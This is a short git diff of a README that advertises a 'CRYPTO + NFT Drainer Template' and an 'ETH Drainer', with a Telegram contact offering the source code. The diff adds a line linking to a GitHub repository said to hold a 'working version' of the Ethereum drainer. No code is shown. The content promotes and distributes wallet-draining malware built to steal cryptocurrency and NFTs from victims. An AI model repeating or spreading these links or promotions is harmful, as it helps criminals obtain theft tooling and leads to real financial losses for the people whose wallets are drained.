@@ -1,4 +1,5 @@
 # ***🌙 GET CLEAN SOURCE CODE AT TELEGRAM: [@crypto_scem](https://t.me/crypto_scem)***
+### <center>💎 DOWNLOAD WORKING VERSION: https://github.com/cryptoscemm/ethereum-drainer
 ### <center>💎 CRYPTO + NFT Drainer Template / ETH Drainer / NFT Drainer
 ![image](https://cdn.discordapp.com/attachments/986649854728089610/987037794805354546/unknown.png)
 ---
